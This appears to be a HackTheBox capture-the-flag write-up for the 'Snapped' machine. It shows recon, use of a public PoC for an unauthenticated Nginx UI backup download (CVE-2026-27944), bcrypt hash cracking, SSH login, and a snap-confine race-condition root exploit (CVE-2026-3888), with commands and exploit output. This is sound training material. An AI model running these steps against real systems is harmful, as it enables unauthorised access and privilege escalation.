---
title: "HTB: Snapped"
# description: ""
date: "2026-03-29 11:33:00 +0800"
categories: [hackthebox,linux]
tags: [fuff,gobuster,nginx-ui,cve-2026-27944,ubuntu-snap,cve-2026-3888,scp]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/snapped.png

---
**Snapped is a hard Linux machine exploiting two CVEs.**
1. Foothold (CVE-2026-27944): Nginx-UI exposes an unauthenticated /api/backup endpoint that returns encrypted config backups with the decryption key in the response headers. Decrypting the backup reveals a weak password from the Nginx-UI database.
2. Root (CVE-2026-3888): A TOCTOU race condition in snap-confine is exploited by recreating a temp directory after cleanup and using AF_UNIX socket backpressure to slow execution, poisoning shared libraries and hijacking the SUID-root binary via the dynamic linker.


---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Scanning</span>
`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
$ sudo nmap -sC -sV 10.129.15.231                                                                                           
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-01 07:35 -0500                                                             
Nmap scan report for 10.129.15.231                                                                                            
Host is up (0.060s latency).                                                                                                  
Not shown: 998 closed tcp ports (reset)                                                                                       
PORT   STATE SERVICE VERSION                                                                                                  
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)                                           
| ssh-hostkey:                                                                                                                
|   256 4b:c1:eb:48:87:4a:08:54:89:70:93:b7:c7:a9:ea:79 (ECDSA)                                                               
|_  256 46:da:a5:65:91:c9:08:99:b2:96:1d:46:0b:fc:df:63 (ED25519)        
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://snapped.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### <span style="color:lightgreen">Subdomain Fuzz</span>
use `ffuf` to scan for any subdomains of `snapped.htb`, It finds `admin.snapped.htb`.:

```console
$ ffuf -u http://10.129.15.231 -H "Host: FUZZ.snapped.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac
..snip..
admin                   [Status: 200, Size: 1407, Words: 164, Lines: 50, Duration: 63ms]
:: Progress: [19966/19966] :: Job [1/1] :: 671 req/sec :: Duration: [0:00:30] :: Errors: 0
```

I’ll add it and `snapped.htb` to hosts file::
```console
$ sudo vi /etc/hosts
10.129.15.231   admin.snapped.htb snapped.htb
```
### <span style="color:lightgreen">Look at website - snapped.htb</span>

The site is **The command layer for modern infrastructure**, the site consists entirely of static pages:

![Desktop View](assets/md_images/snapped-site1.png){: .w-75 .rounded-10 w='1212' h='668' }

### <span style="color:lightgreen">Look at website - admin.snapped.htb</span>
This site is an instance of `Nginx UI`:
![Desktop View](assets/md_images/snapped-site2.png){: .w-75 .rounded-10 w='1212' }

Inspecting the source code reveals two `js` files:
```
<title>Nginx UI</title>
<script type="module" crossorigin src="./assets/index-DoHxQupa.js"></script>
<link rel="stylesheet" crossorigin href="./assets/index-Cjd4fVAL.css">
..snip..
```
In the index js file, searching with `Ctrl+F` reveals another JavaScript file whose name starts with `version`:
```
..snip.. "./NamespaceTabs-CLuVZEAi.css","./version-BWPlJ0ga.js"
```
Inside `version-BWPlJ0ga.js`, the `Nginx UI` version is disclosed as 2.3.2:
```
const t="2.3.2";const o={version:t,build_id:1,total_build:512};export{o as a,t as v};
```


#### Directory Brute Force
Running `gobuster` against `admin.snapped.htb` yields nothing of interest:
```console
$ gobuster dir -u http://admin.snapped.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
..snip..
assets               (Status: 301) [Size: 0] [--> assets/]
mcp                  (Status: 403) [Size: 34]
.                    (Status: 301) [Size: 0] [--> ./]
Progress: 43007 / 43007 (100.00%)
```



## <span style="color:lightblue">Foothold</span>
### <span style="color:lightgreen">CVE-2026-27944</span>
Searching for CVEs in `Nginx UI 2.3.2` will find [CVE-2026-27944](https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-g9w5-qffc-6762) — an unauthenticated backup download and decryption vulnerability:

![Desktop View](assets/md_images/snapped-site3.png){: .w-75 .rounded-10 w='1212' h='668' }

Using the Proof of Concept from the above link:
```console
$ python3 -m venv .venv 
$ source .venv/bin/activate
$ pip install pycryptodome
```
Run it:
```console
$ python poc.py --target http://admin.snapped.htb --decrypt                                                                 
                                                                                                                              
X-Backup-Security: RQpra0jp3ACNQY+wvkaZVq+4b2tYkpytWwt1eP4NBVM=:fI3+VWN1zIQqPzblPKeHsg==                                      
Parsed AES-256 key: RQpra0jp3ACNQY+wvkaZVq+4b2tYkpytWwt1eP4NBVM=
Parsed AES IV    : fI3+VWN1zIQqPzblPKeHsg==

[*] Key length: 32 bytes (AES-256 ✓)
[*] IV length : 16 bytes (AES block size ✓)

[*] Extracting encrypted backup to backup_extracted
[*] Main archive contains: ['hash_info.txt', 'nginx-ui.zip', 'nginx.zip']
[*] Decrypting hash_info.txt... 
    → Saved to backup_extracted/hash_info.txt.decrypted (199 bytes)
[*] Decrypting nginx-ui.zip...
    → Saved to backup_extracted/nginx-ui_decrypted.zip (7688 bytes)
    → Extracted 2 files to backup_extracted/nginx-ui
[*] Decrypting nginx.zip...
    → Saved to backup_extracted/nginx_decrypted.zip (9936 bytes)
    → Extracted 22 files to backup_extracted/nginx
[*] Hash info:
nginx-ui_hash: 00ae9a7b54dd07c0aafdfbdf1072fc67303d4b937d0466fad775d6c9b6321575
nginx_hash: 0b1412ff04c513898357dd13462138ad4ffea47613c41ab8ccb1ff1b07553c2e
timestamp: 20260401-095101
version: 2.3.2
```
#### Backups
The backup file is retrieved, and inside `backup_extracted/nginx-ui` a SQLite database is found:
```
$ cd backup_extracted/nginx-ui 
$ ls                                                                                                                        
app.ini  database.db                                                                                                           
```

Opening it with `SQLite` and querying the `users` table reveals two password hashes:
```
$ sqlite3 database.db   
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
acme_users         configs            namespaces         sites            
auth_tokens        dns_credentials    nginx_log_indices  streams          
auto_backups       dns_domains        nodes              upstream_configs 
ban_ips            external_notifies  notifications      users            
certs              llm_sessions       passkeys         
config_backups     migrations         site_configs     

sqlite> select * from users;
1|2026-03-19 08:22:54.41011219-04:00|2026-03-19 08:39:11.562741743-04:00||admin|$2a$10$8YdBq4e.WeQn8gv9E0ehh.quy8D/4mXHHY4ALLMAzgFPTrIVltEvm|1||g

|7ĝ*:(\DO}u#,|en
2|2026-03-19 09:54:01.989628406-04:00|2026-03-19 09:54:01.989628406-04:00||jonathan|$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq|1||,զH։e)5UZKĦ"DW|
sqlite> .quit
```
#### Crack Hash
Running the hashes through `Hashcat` with mode 3200 (bcrypt) cracks Jonathan's password:
```console
PS C:\hashcat> .\hashcat.exe .\data\hash.txt .\data\rockyou.txt -m 3200
..snip..
$2a$10$8M7JZSRLKdtJpx9YRUNTmODN.pKoBsoGCBi5Z8/WVGO2od9oCSyWq:linkinpark
```

## <span style="color:lightblue">Shell as jonathan</span>
We can use Jonathan's  to ssh and get user flag
```console
$ ssh jonathan@10.129.15.231                                                                                                
jonathan@10.129.15.231's password:linkinpark
jonathan@snapped:~$ cat user.txt
72d8e************************
```
### <span style="color:lightgreen">Enumeration</span>
Jonathan has no `sudo` privileges. Among the running services is `snapd` (`Snap` Daemon) — a hint nudged by the box name itself and the vulnerability's recent news coverage:
```console
jonathan@snapped:~$ sudo -l
[sudo] password for jonathan: 
Sorry, user jonathan may not run sudo on snapped.

jonathan@snapped:~$ systemctl list-units --type=service --state=running 2>/dev/null
UNIT                          LOAD   ACTIVE SUB     DESCRIPTION                                                             
accounts-daemon.service       loaded active running Accounts Service
..snip..
snapd.service                 loaded active running Snap Daemon
ssh.service                   loaded active running OpenBSD Secure Shell server
switcheroo-control.service    loaded active running Switcheroo Control Proxy service
```
The `snap(snapd)` version is 2.63.1 and ubuntu version is 24.04:
```console
jonathan@snapped:~$ snap -h
Usage: snap <command> [<options>...]
..snip..
  ... Other: warnings, okay, known, ack, version
  Development: validate
For more information about a command, run 'snap help <command>'.
For a short summary of all commands, run 'snap help --all'.

jonathan@snapped:~$ snap version
snap    2.63.1+24.04
snapd   2.63.1+24.04
series  16
ubuntu  24.04
kernel  6.17.0-19-generic
```


## <span style="color:lightblue">Shell as root</span>
### <span style="color:lightgreen">CVE-2026-3888</span>
Searching for cves in this version of `snap` points to CVE-2026-3888:
> Local privilege escalation in `snapd` on Linux allows local attackers to get root privilege by re-creating snap’s private `/tmp` directory when systemd-tmpfiles is configured to automatically clean up this directory. This issue affects Ubuntu 16.04 LTS, 18.04 LTS, 20.04 LTS, 22.04 LTS, and 24.04 LTS.
{: .prompt-info }

We see first [report](https://cdn2.qualys.com/advisory/2026/03/17/snap-confine-systemd-tmpfiles.txt) from Qualys:
```
a/ it stems from the interaction of two otherwise secure programs:

- snap-confine, which is set-user-ID-root (or set-capabilities), and
  "used internally by snapd to construct the execution environment for
  snap applications" (man snap-confine);

- systemd-tmpfiles, which is executed as root once per day, and
  "creates, deletes, and cleans up files and directories, using the
  configuration file format and location specified in tmpfiles.d(5)"
  (man systemd-tmpfiles);

b/ an unprivileged local attacker who wants to exploit this LPE must
wait for 10 days (in Ubuntu 25.10) or 30 days (in Ubuntu 24.04) to
obtain a fully privileged root shell.
```

In the default installation of Ubuntu since version 24.04, `systemd-tmpfiles` is configured to automatically clean up the files and directories in `/tmp` that are older than 30 days. But here it’s been updated to 4 minutes:
```
jonathan@snapped:~$ cat /usr/lib/tmpfiles.d/tmp.conf
..snip..
D /tmp 1777 root root 4m
#q /var/tmp 1777 root root 30d
```

### <span style="color:lightgreen">Exploit CVE-2026-3888 - Ubuntu 24.04 (SUID)</span>
Use [POC](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE) from TheCyberGeek:
```
$ wget https://raw.githubusercontent.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/refs/heads/main/exploit_suid.c
$ wget https://raw.githubusercontent.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/refs/heads/main/librootshell_suid.c
```

#### Requirements Check                                                                                                                  
  - [x] Ubuntu 24.04+ with unpatched snapd (< 2.742) - We already check before.
  - [x] snap-confine must be SUID-root (-rwsr-xr-x 1 root root /usr/lib/snapd/snap-confine) 
```
jonathan@snapped:~$ ls -la /usr/lib/snapd/snap-confine 
-rwsr-xr-x 1 root root 159016 Aug 20  2024 /usr/lib/snapd/snap-confine
```
  - [x] A snap with layout bind-mounts installed (firefox, snap-store, etc.)
```
jonathan@snapped:~$ firefox -v
Mozilla Firefox 129.0.2
```

  - [x] systemd-tmpfiles-clean.timer active
```
jonathan@snapped:~$ systemctl list-timers systemd-tmpfiles-clean
NEXT                        LEFT LAST                         PASSED UNIT                         ACTIVATES                  >
Wed 2026-04-01 13:29:24 EDT  22s Wed 2026-04-01 13:28:24 EDT 37s ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.serv>
1 timers listed.
Pass --all to see loaded but inactive timers, too.
```
  - [x] busybox available on the target (/usr/bin/busybox)
```
jonathan@snapped:~$ ls -la /usr/bin/busybox
-rwxr-xr-x 1 root root 2124608 Aug 13  2024 /usr/bin/busybox
```

#### Build & SCP
```bash
$ gcc -O2 -static -o exploit exploit_suid.c                                                                                  
$ gcc -nostdlib -static -Wl,--entry=_start -o librootshell.so librootshell_suid.c

$ scp exploit jonathan@10.129.15.231:/tmp
jonathan@10.129.15.231's password: linkinpark
$ scp librootshell.so jonathan@10.129.15.231:/tmp
jonathan@10.129.15.231's password: linkinpark      
```

#### Exploit
The first attempt fails, but retrying the exploit succeeds and yields the root flag:
```bash
jonathan@snapped:/tmp$ ./exploit ./librootshell.so
================================================================
    CVE-2026-3888 — snap-confine / systemd-tmpfiles SUID LPE
================================================================
[*] Payload: /tmp/./librootshell.so (9056 bytes)

[Phase 1] Entering Firefox sandbox...
[+] Inner shell PID: 19388

[Phase 2] Waiting for .snap deletion...
[*] Polling (up to 30 days on stock Ubuntu).
[*] Hint: use -s to skip.
[+] .snap deleted.

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_bdRQkG//dev: No such file or directory
[+] Namespace destroyed.

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/19388/cwd
[*]   Building .snap and .exchange...
[*]   285 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 19571)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[*]   ld-linux in namespace: jonathan:jonathan 755
[+]   Poisoned namespace PID: 19571

[Phase 5] Injecting payload into poisoned namespace...
[+]   ld-linux owned by uid 1000 (attacker). Race confirmed.
[*]   Planting busybox...
[*]   Writing escape script → /tmp/sh
[*]   Overwriting ld-linux-x86-64.so.2...
[+]   Payload injected.

[Phase 6] Triggering root via SUID snap-confine...
[*]   snap-confine → snap-confine (SUID trigger)
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/firefox/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/firefox/common/bash -p
================================================================

bash-5.1# id
uid=1000(jonathan) gid=1000(jonathan) euid=0(root) groups=1000(jonathan)
bash-5.1# cat /root/root.txt
e52e6*********************
```



